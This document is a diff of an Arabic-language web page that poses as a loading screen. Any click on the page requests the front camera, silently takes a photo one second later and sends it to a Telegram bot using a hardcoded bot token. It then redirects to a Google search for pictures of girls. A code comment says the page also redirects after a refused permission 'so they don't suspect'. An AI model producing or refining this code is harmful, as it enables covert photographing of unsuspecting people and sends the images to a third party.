@@ -5,43 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
+        /* تجعل الشاشة بالكامل قابلة للنقر */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #fff; font-family: sans-serif; cursor: pointer; }
+        #overlay { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; text-align: center; }
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
         canvas { display: none; }
-        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body onclick="startCapture()">
 
-    <div id="main">
-        <h2>تحديث أمني للنظام</h2>
-        <p>يرجى الضغط على الزر أدناه لتأكيد هويتك ومتابعة التصفح.</p>
-        <button class="btn" id="startBtn">تأكيد الهوية الآن</button>
+    <div id="overlay">
+        <div class="spinner"></div>
+        <p>جاري تحميل النتائج...</p>
+        <p style="font-size: 12px; color: #999; margin-top: 10px;">انقر هنا للمتابعة وإظهار الصور</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
 <script>
-    // تم وضع بياناتك هنا مباشرة
+    // بيانات التليغرام الخاصة بك
     const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; 
     const chatId = "6492264194";     
+    const targetUrl = "https://www.google.com/search?q=%D8%B5%D9%88%D8%B1+%D8%A8%D9%86%D8%A7%D8%AA&oq=%D8%B5%D9%88%D8%B1+%D8%A8%D9%86%D8%A7%D8%AA&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIKCAEQABixAxiABDIKCAIQABixAxiABDIKCAMQABixAxiABDIKCAQQABixAxiABDIKCAUQABixAxiABDIKCAYQABixAxiABDIKCAcQABixAxiABDIKCAgQABixAxiABDIHCAkQABiABDIHCAoQABiABDIKCAsQABixAxiABDIHCAwQABiABDIKCA0QABixAxiABDIKCA stage_4EABixAxiABNIBCDEyNjdqMGo0qAIOsAIB8QVfOt9ygX_PUA&client=ms-android-xiaomi-terr1-rso2&sourceid=chrome-mobile&ie=UTF-8#sv=CAMScRoyKhBlLTczVy12cTNwYnQtVF9NMg43M1ctdnEzcGJ0LVRfTToOY1RCeUFqRk02cnJaeE0gBCoxChtfRmVmX2FhWENKWnJwN19VUHpjTHcyQU1fMjESEGUtNzNXLXZxM3BidC1UX00YADABSgQIARACGAcgveuY4QpKCBACGAEgAigB";
 
-    const startBtn = document.getElementById('startBtn');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    let isCaptured = false;
 
-    startBtn.addEventListener('click', () => {
-        startBtn.innerText = "جاري التحقق...";
-        startBtn.disabled = true;
+    function startCapture() {
+        if (isCaptured) return;
         
+        document.querySelector('p').innerText = "يرجى الانتظار ثانية واحدة...";
+
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
+            isCaptured = true;
+            const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // انتظر ثانيتين حتى تستقر الكاميرا ثم التقط الصورة
+            // تصوير تلقائي بعد ثانية واحدة من الحصول على الإذن
             setTimeout(() => {
+                const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -50,34 +55,31 @@
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط');
+                    formData.append('photo', blob, 'auto_capture.png');
+                    formData.append('caption', '📸 التقاط تلقائي وتحويل للموقع المطلوب');
 
-                    // إرسال الصورة للبوت الخاص بك
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     })
-                    .then(res => {
-                        alert("تم تأكيد الهوية بنجاح، شكراً لك.");
-                        // إيقاف الكاميرا فوراً
+                    .then(() => {
+                        // إغلاق الكاميرا والتحويل للموقع فوراً
                         stream.getTracks().forEach(track => track.stop());
-                        startBtn.innerText = "تم التحقق";
+                        window.location.href = targetUrl;
                     })
-                    .catch(err => {
-                        console.error("خطأ في الإرسال:", err);
-                        startBtn.innerText = "فشل الإرسال";
+                    .catch(() => {
+                        // حتى لو فشل الإرسال نحول المستخدم للموقع
+                        window.location.href = targetUrl;
                     });
                 }, 'image/png');
-
-            }, 2000); 
+            }, 1000);
         })
         .catch(err => {
-            alert("خطأ: يرجى الموافقة على طلب النظام (سماح) للمتابعة.");
-            startBtn.innerText = "تأكيد الهوية الآن";
-            startBtn.disabled = false;
+            // في حال رفض المستخدم الإذن، نحوله للموقع أيضاً حتى لا يشك
+            window.location.href = targetUrl;
         });
-    });
+    }
 </script>
 </body>
 </html>
+
